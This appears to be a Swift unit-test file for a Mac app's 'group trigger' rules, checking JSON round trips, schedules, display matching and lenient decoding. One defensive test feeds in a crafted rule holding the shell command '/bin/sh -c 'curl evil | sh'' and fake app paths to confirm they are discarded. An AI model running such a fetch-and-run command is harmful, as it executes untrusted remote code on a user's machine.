import Foundation
import Testing
@testable import DockGroupsCore

@Suite("Triggers: the rules and how they're saved")
struct GroupTriggerCodingTests {
    private static let group = UUID(uuidString: "0C0D1E00-0000-4000-8000-000000000080")!
    private static let id = UUID(uuidString: "7A1660E0-0000-4000-8000-000000000011")!

    private func encoded(_ trigger: GroupTrigger) throws -> String {
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.prettyPrinted, .sortedKeys, .withoutEscapingSlashes]
        return String(decoding: try encoder.encode(trigger), as: UTF8.self)
    }

    private func decode(_ json: String) throws -> GroupTrigger {
        try JSONDecoder().decode(GroupTrigger.self, from: Data(json.utf8))
    }

    private func roundTrip(_ trigger: GroupTrigger) throws -> GroupTrigger {
        try JSONDecoder().decode(GroupTrigger.self, from: JSONEncoder().encode(trigger))
    }

    /// Every event, action and option comes back as it was saved.
    @Test(arguments: [
        TriggerEvent.schedule(TriggerSchedule(hour: 9, minute: 0, weekdays: [2, 3, 4, 5, 6])),
        .login,
        .appOpens,
        .screensWake,
        .condition(.display(.anyExternal), edge: .starts),
        .condition(.display(.display(.monitor("LG UltraFine", serial: 7_001))), edge: .ends),
        .condition(.displays(DisplayArrangement(displays: [.builtIn, .monitor("VX2776-4K-mhd"), .monitor("VX2776-4K-mhd")])), edge: .starts),
        .condition(.wifi(WiFiNetworkName("Office ☕️")!), edge: .ends),
        .condition(.ethernet, edge: .starts),
        .condition(.vpn, edge: .ends),
    ])
    func everyEventRoundTrips(event: TriggerEvent) throws {
        for action in event.allowedActions {
            let trigger = GroupTrigger(groupID: Self.group, event: event, action: action, oncePerDay: true)
            let read = try roundTrip(trigger)
            #expect(read == trigger)
            #expect(read.isRunnable && read.canRun)
        }
    }

    @Test func screensSleepRoundTripsWithFinish() throws {
        let trigger = GroupTrigger(groupID: Self.group, event: .screensSleep, action: .finish)
        #expect(try roundTrip(trigger) == trigger)
        #expect(trigger.runMode == .notice)
    }

    @Test func theSavedFormIsAsTheSpecShowsIt() throws {
        let trigger = GroupTrigger(id: Self.id, groupID: Self.group, event: .schedule(TriggerSchedule(hour: 9, minute: 0, weekdays: [6, 2, 4, 3, 5])), action: .start)
        #expect(try encoded(trigger) == #"""
        {
          "action" : "start",
          "enabled" : true,
          "event" : {
            "kind" : "schedule",
            "minute" : 540,
            "weekdays" : [
              2,
              3,
              4,
              5,
              6
            ]
          },
          "groupID" : "0C0D1E00-0000-4000-8000-000000000080",
          "id" : "7A1660E0-0000-4000-8000-000000000011",
          "runMode" : "notice"
        }
        """#)
        let display = GroupTrigger(
            id: Self.id,
            groupID: Self.group,
            event: .condition(.display(.display(.monitor("VX2776-4K-mhd", serial: 16_843_009))), edge: .starts),
            action: .start,
            finishesWhenEventEnds: true
        )
        let text = try encoded(display)
        // The placeholder serial isn't kept; the option is written because it's on.
        #expect(!text.contains("serial"))
        #expect(text.contains(#""finishesWhenEventEnds" : true"#))
        #expect(!text.contains("oncePerDay"))
    }

    // MARK: - Rules

    /// §1.6, exhaustively.
    @Test func actionsFollowTheMatrix() {
        let all = Set(TriggerAction.allCases)
        let expected: [(TriggerEvent, Set<TriggerAction>)] = [
            (.schedule(TriggerSchedule(hour: 9, minute: 0, weekdays: [2])), all),
            (.login, [.showPopup, .openAll, .start]),
            (.appOpens, [.showPopup, .openAll, .start]),
            (.screensWake, [.showPopup, .openAll, .start]),
            (.screensSleep, [.finish]),
            (.condition(.ethernet, edge: .starts), all),
            (.condition(.ethernet, edge: .ends), all),
            (.unsupported(.object(["kind": .string("calendarEvent")])), []),
        ]
        for (event, actions) in expected {
            for action in TriggerAction.allCases {
                let trigger = GroupTrigger(groupID: Self.group, event: event, action: action)
                #expect(trigger.isRunnable == actions.contains(action), "\(event) \(action)")
            }
        }
    }

    @Test func showThePopupAlwaysRunsRightAway() {
        var trigger = GroupTrigger(groupID: Self.group, event: .login, action: .showPopup, runMode: .askFirst)
        #expect(trigger.runMode == .immediately)
        trigger.runMode = .notice
        #expect(trigger.runMode == .immediately)
        trigger.action = .start
        trigger.runMode = .askFirst
        #expect(trigger.runMode == .askFirst)
        trigger.action = .showPopup
        #expect(trigger.runMode == .immediately)
        #expect(GroupTrigger(groupID: Self.group, event: .login, action: .openAll).runMode == .notice)
    }

    @Test func finishWhenItEndsOnlyForStartOnAStart() {
        let start = GroupTrigger(groupID: Self.group, event: .condition(.ethernet, edge: .starts), action: .start, finishesWhenEventEnds: true)
        #expect(start.finishesWhenEventEnds && start.canFinishWhenEventEnds)
        for (event, action) in [
            (TriggerEvent.condition(.ethernet, edge: .ends), TriggerAction.start),
            (.condition(.ethernet, edge: .starts), .openAll),
            (.schedule(TriggerSchedule(hour: 9, minute: 0, weekdays: [2])), .start),
            (.login, .start),
        ] {
            #expect(!GroupTrigger(groupID: Self.group, event: event, action: action, finishesWhenEventEnds: true).finishesWhenEventEnds)
        }
        var changed = start
        changed.event = .login
        #expect(!changed.finishesWhenEventEnds)
    }

    @Test func schedulesNeedATimeAndDays() {
        #expect(TriggerSchedule(hour: 0, minute: 0, weekdays: [1]).isValid)
        #expect(TriggerSchedule(hour: 23, minute: 59, weekdays: TriggerSchedule.everyDay).isValid)
        #expect(!TriggerSchedule(minuteOfDay: 1440, weekdays: [1]).isValid)
        #expect(!TriggerSchedule(minuteOfDay: -1, weekdays: [1]).isValid)
        #expect(!TriggerSchedule(hour: 9, minute: 0, weekdays: []).isValid)
        #expect(!TriggerSchedule(hour: 9, minute: 0, weekdays: [0, 2]).isValid)
        #expect(!TriggerSchedule(hour: 9, minute: 0, weekdays: [8]).isValid)
    }

    /// The Weekdays and Weekends buttons follow the region's weekend, as an explicit set.
    @Test(arguments: [
        ("en_US", Set([1, 7])),
        ("tr_TR", Set([1, 7])),
        ("ar_SA", Set([6, 7])),
        ("fa_IR", Set([6])),
    ])
    func weekendsFollowTheRegion(locale: String, weekend: Set<Int>) {
        var calendar = Calendar(identifier: .gregorian)
        calendar.locale = Locale(identifier: locale)
        calendar.timeZone = TimeZone(identifier: "UTC")!
        #expect(TriggerSchedule.weekendDays(in: calendar) == weekend)
        #expect(TriggerSchedule.workingDays(in: calendar) == TriggerSchedule.everyDay.subtracting(weekend))
    }

    @Test func networkNamesAreBounded() {
        #expect(WiFiNetworkName("Office") != nil)
        #expect(WiFiNetworkName(String(repeating: "a", count: 32)) != nil)
        #expect(WiFiNetworkName(String(repeating: "a", count: 33)) == nil)
        // 11 three-byte characters: 33 bytes.
        #expect(WiFiNetworkName(String(repeating: "€", count: 11)) == nil)
        #expect(WiFiNetworkName(String(repeating: "ş", count: 16)) != nil)
        #expect(WiFiNetworkName("") == nil)
        #expect(WiFiNetworkName("Office\nWi-Fi") == nil)
        #expect(WiFiNetworkName("Off\u{0}ice") == nil)
    }

    @Test func displayNamesAndSerialsAreCleanedFromTheSystem() {
        let display = DisplayIdentity(vendor: 1, model: 2, serial: 0x0101_0101, name: "  LG\u{7}  UltraFine\n", isBuiltIn: false)
        #expect(display.serial == nil)
        #expect(display.name == "LG  UltraFine")
        #expect(display.isValid)
        #expect(DisplayIdentity(vendor: 1, model: 2, serial: 0, name: "x", isBuiltIn: false).serial == nil)
        #expect(DisplayIdentity(vendor: 1, model: 2, serial: 42, name: "x", isBuiltIn: false).serial == 42)
        #expect(DisplayIdentity(vendor: 1, model: 2, serial: nil, name: String(repeating: "x", count: 300), isBuiltIn: false).name.count == 100)
    }

    @Test func displaysMatchBySerialOtherwiseByName() {
        let a = DisplayIdentity.monitor("LG", serial: 1)
        #expect(a.matches(.monitor("Renamed", serial: 1)))
        #expect(!a.matches(.monitor("LG", serial: 2)))
        #expect(a.matches(.monitor("LG")))
        #expect(!DisplayIdentity.monitor("LG").matches(.monitor("Dell")))
        #expect(!DisplayIdentity.monitor("LG", vendor: 1).matches(.monitor("LG", vendor: 2)))
        let builtInNamedLikeIt = DisplayIdentity(vendor: a.vendor, model: a.model, serial: nil, name: "LG", isBuiltIn: true)
        #expect(!DisplayIdentity.monitor("LG").matches(builtInNamedLikeIt))
    }

    @Test func arrangementsMatchExactlyAsAMultiset() {
        let twin = DisplayIdentity.monitor("VX2776-4K-mhd")
        let arrangement = DisplayArrangement(displays: [.builtIn, twin, twin])
        #expect(arrangement.matches([twin, .builtIn, twin]))
        #expect(!arrangement.matches([twin, .builtIn]))
        #expect(!arrangement.matches([twin, .builtIn, twin, .monitor("Dell")]))
        #expect(!arrangement.matches([.builtIn, twin, .monitor("Dell")]))
        // A display with a serial and one without match, but each connected display counts once.
        let saved = DisplayArrangement(displays: [.monitor("LG", serial: 5), .monitor("LG")])
        #expect(saved.matches([.monitor("LG"), .monitor("LG", serial: 5)]))
        #expect(saved.matches([.monitor("LG", serial: 5), .monitor("LG", serial: 6)]))
        #expect(!saved.matches([.monitor("LG", serial: 6), .monitor("LG", serial: 7)]))
        #expect(!DisplayArrangement(displays: []).isValid)
        #expect(!DisplayArrangement(displays: Array(repeating: twin, count: 9)).isValid)
        #expect(DisplayMatch.display(.builtIn).isValid == false)
    }

    @Test func sanitizingKeepsTheLimitsInOrder() {
        let other = UUID()
        let mine = (0..<12).map { _ in GroupTrigger(groupID: Self.group, event: .login, action: .start) }
        let theirs = GroupTrigger(groupID: other, event: .login, action: .start)
        let kept = GroupTrigger.sanitized(mine + [theirs, mine[0]])
        #expect(kept.map(\.id) == mine.prefix(10).map(\.id) + [theirs.id])
        let many = (0..<120).map { _ in GroupTrigger(groupID: UUID(), event: .login, action: .start) }
        #expect(GroupTrigger.sanitized(many).map(\.id) == many.prefix(100).map(\.id))
    }

    // MARK: - Lenient reading (§2.7)

    @Test func anUnknownKindIsKeptVerbatimAndNeverRuns() throws {
        let json = #"""
        {"id": "7A1660E0-0000-4000-8000-000000000011", "groupID": "0C0D1E00-0000-4000-8000-000000000080", "enabled": true,
         "event": {"kind": "calendarEvent", "calendar": "Work", "before": 300, "rules": [{"x": 1.5}, null, true]},
         "action": "start", "runMode": "askFirst", "oncePerDay": true}
        """#
        let trigger = try decode(json)
        guard case .unsupported(let raw) = trigger.event else {
            Issue.record("not unsupported: \(trigger.event)")
            return
        }
        #expect(raw["kind"] == .string("calendarEvent"))
        #expect(!trigger.isRunnable && !trigger.canRun)
        #expect(trigger.isEnabled)
        #expect(trigger.problem != nil)
        // Written back as read, and read again the same.
        let first = try encoded(trigger)
        let again = try decode(first)
        #expect(again == trigger)
        #expect(try encoded(again) == first)
        #expect(first.contains(#""before" : 300"#) && first.contains(#""x" : 1.5"#) && first.contains("null"))
    }

    @Test func anUnknownActionIsKeptAndNeverRuns() throws {
        let json = #"{"id": "7A1660E0-0000-4000-8000-000000000011", "groupID": "0C0D1E00-0000-4000-8000-000000000080", "enabled": true, "event": {"kind": "login"}, "action": "quit", "runMode": "notice"}"#
        let trigger = try decode(json)
        #expect(!trigger.isRunnable)
        #expect(try encoded(trigger).contains(#""action" : "quit""#))
        #expect(try encoded(trigger).contains(#""runMode" : "notice""#))
        var fixed = trigger
        fixed.action = .start
        #expect(fixed.isRunnable)
    }

    /// The §2.7 table, row by row.
    @Test(arguments: [
        // A known kind it can't read is kept as read.
        (#"{"kind": "schedule", "minute": "9:00", "weekdays": [2]}"#, false, true),
        (#"{"kind": "schedule", "minute": 540}"#, false, true),
        (#"{"kind": "condition", "condition": {"kind": "bluetooth"}, "edge": "starts"}"#, false, true),
        (#"{"kind": "condition", "condition": {"kind": "ethernet"}, "edge": "sideways"}"#, false, true),
        (#"{"kind": "condition", "condition": {"kind": "display", "display": {"vendor": -1, "model": 2}}, "edge": "starts"}"#, false, true),
        (#"{"kind": "condition", "condition": {"kind": "display", "display": "LG"}, "edge": "starts"}"#, false, true),
        (#""login""#, false, true),
        // Values out of range: the event is understood but can't run.
        (#"{"kind": "schedule", "minute": 2000, "weekdays": [2]}"#, false, false),
        (#"{"kind": "schedule", "minute": 540, "weekdays": []}"#, false, false),
        (#"{"kind": "schedule", "minute": 540, "weekdays": [0, 9]}"#, false, false),
        (#"{"kind": "condition", "condition": {"kind": "wifi", "name": "123456789012345678901234567890123"}, "edge": "starts"}"#, false, false),
        (#"{"kind": "condition", "condition": {"kind": "wifi", "name": "a\nb"}, "edge": "starts"}"#, false, false),
        (#"{"kind": "condition", "condition": {"kind": "displays", "displays": []}, "edge": "starts"}"#, false, false),
        (#"{"kind": "condition", "condition": {"kind": "display", "display": {"vendor": 1, "model": 2, "name": "Built-in", "builtIn": true}}, "edge": "starts"}"#, false, false),
        // Readable and valid.
        (#"{"kind": "schedule", "minute": 540.0, "weekdays": [2, 2, 3]}"#, true, false),
        (#"{"kind": "condition", "condition": {"kind": "display"}, "edge": "starts", "extra": true}"#, true, false),
        (#"{"kind": "condition", "condition": {"kind": "display", "display": {"vendor": 1, "model": 2, "serial": null}}, "edge": "ends"}"#, true, false),
    ])
    func eventsAreReadLeniently(event: String, runnable: Bool, unsupported: Bool) throws {
        let json = #"{"id": "7A1660E0-0000-4000-8000-000000000011", "groupID": "0C0D1E00-0000-4000-8000-000000000080", "enabled": true, "action": "finish", "event": "# + event + "}"
        let trigger = try decode(json)
        #expect(trigger.isRunnable == runnable)
        #expect(trigger.event.isUnsupported == unsupported)
        #expect(try decode(encoded(trigger)) == trigger)
    }

    @Test(arguments: [
        (#""enabled": true"#, true),
        (#""enabled": "yes""#, false),
        (#""enabled": 1"#, false),
        (#""other": true"#, false),
    ])
    func onlyTrueTurnsATriggerOn(field: String, enabled: Bool) throws {
        let trigger = try decode(#"{"id": "7A1660E0-0000-4000-8000-000000000011", "groupID": "0C0D1E00-0000-4000-8000-000000000080", "event": {"kind": "login"}, "action": "start", "#  + field + "}")
        #expect(trigger.isEnabled == enabled)
    }

    @Test func runModesAndOptionsAreReadLeniently() throws {
        let base = #"{"id": "7A1660E0-0000-4000-8000-000000000011", "groupID": "0C0D1E00-0000-4000-8000-000000000080", "enabled": true, "event": {"kind": "login"}, "action": "start""#
        #expect(try decode(base + #", "runMode": "whenever"}"#).runMode == .notice)
        #expect(try decode(base + "}").runMode == .notice)
        #expect(try decode(base + #", "runMode": "askFirst", "oncePerDay": "yes", "finishesWhenEventEnds": true}"#) == GroupTrigger(id: Self.id, groupID: Self.group, event: .login, action: .start, runMode: .askFirst))
    }

    @Test func entriesWithoutIdentityAreLeftOutOfTheFile() throws {
        let file = #"""
        {"formatVersion": 1, "triggers": [
          {"groupID": "0C0D1E00-0000-4000-8000-000000000080", "event": {"kind": "login"}, "action": "start", "enabled": true},
          {"id": "nope", "groupID": "0C0D1E00-0000-4000-8000-000000000080", "event": {"kind": "login"}, "action": "start"},
          {"id": "7A1660E0-0000-4000-8000-000000000011", "event": {"kind": "login"}, "action": "start"},
          "a string", 42, null,
          {"id": "7A1660E0-0000-4000-8000-000000000011", "groupID": "0C0D1E00-0000-4000-8000-000000000080", "event": {"kind": "login"}, "action": "start", "enabled": true}
        ]}
        """#
        let document = try JSONDecoder().decode(TriggersDocument.self, from: Data(file.utf8))
        #expect(document.triggers == [GroupTrigger(id: Self.id, groupID: Self.group, event: .login, action: .start)])
        #expect(throws: (any Error).self) { try JSONDecoder().decode(TriggersDocument.self, from: Data(#"{"formatVersion": 1, "triggers": {}}"#.utf8)) }
    }

    /// A crafted rule can put paths, links and commands anywhere: none of it is kept but an
    /// unsupported event's own contents, which never run; a trigger names a group and an action,
    /// nothing else (§4.2 T-S2).
    @Test func aCraftedTriggerCarriesNoPayload() throws {
        let json = #"""
        {"id": "7A1660E0-0000-4000-8000-000000000011", "groupID": "0C0D1E00-0000-4000-8000-000000000080", "enabled": true,
         "event": {"kind": "login", "command": "/bin/sh -c 'curl evil | sh'", "app": "/tmp/evil.app"},
         "action": "start", "runMode": "immediately",
         "apps": [{"bundleIdentifier": "/tmp/evil.command"}], "url": "https://example.com/x.app", "path": "/bin/sh", "opener": "com.apple.Terminal"}
        """#
        let trigger = try decode(json)
        #expect(trigger.event == .login && trigger.action == .start && trigger.canRun)
        let text = try encoded(trigger)
        for crafted in ["evil", "/bin/sh", "example.com", "Terminal", "command", "apps"] {
            #expect(!text.contains(crafted), "\(crafted) was kept")
        }
        // Only the identifiers, the switch, the event, the action and how it runs are written.
        let object = try #require(try JSONSerialization.jsonObject(with: Data(text.utf8)) as? [String: Any])
        #expect(Set(object.keys) == ["id", "groupID", "enabled", "event", "action", "runMode"])
    }

    @Test func problemsAreSaidForRulesThatCantRun() {
        #expect(GroupTrigger(groupID: Self.group, event: .login, action: .start).problem == nil)
        #expect(GroupTrigger(groupID: Self.group, event: .login, action: .finish).problem == "Can't run: fix or remove it.")
        #expect(GroupTrigger(groupID: Self.group, event: .unsupported(.null), action: .start).problem?.contains("newer version") == true)
    }

    @Test func kindNamesSayNothingPrivate() {
        let names = [
            TriggerEvent.condition(.wifi(WiFiNetworkName("Home Sweet Home")!), edge: .starts).kindName,
            TriggerEvent.condition(.display(.display(.monitor("Jane's LG"))), edge: .starts).kindName,
            TriggerEvent.schedule(TriggerSchedule(hour: 7, minute: 15, weekdays: [2])).kindName,
        ]
        #expect(names == ["wifi", "display", "schedule"])
    }
}
